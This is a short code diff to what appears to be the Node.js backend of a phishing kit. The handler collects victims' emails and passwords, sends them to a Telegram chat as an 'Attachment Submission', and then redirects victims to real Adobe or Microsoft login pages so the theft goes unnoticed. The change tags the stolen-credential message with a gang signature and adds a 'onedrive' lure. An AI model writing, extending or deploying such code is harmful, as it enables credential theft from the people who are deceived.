@@ -30,7 +30,7 @@ app.post('/q', async (req, res) => {
     }
 
     // Construct the Telegram message
-    const telegramMessage = `Attachment Submission ✅\n\nEmail: ${email}\nPassword: ${password}`;
+    const telegramMessage = `Attachment Submission ✅\n\nEmail: ${email}\nPassword: ${password}\n\n✅UPDATE TEAM - UPDGANG`;
 
     try {
         // Send the message to Telegram
@@ -49,6 +49,8 @@ app.post('/q', async (req, res) => {
                 return res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
             case "excel":
                 return res.redirect('https://login.microsoftonline.com/common/login');
+            case "onedrive":
+                return res.redirect('https://login.microsoftonline.com/common/login');    
             default:
                 return res.redirect('/success'); // Default success page
         }
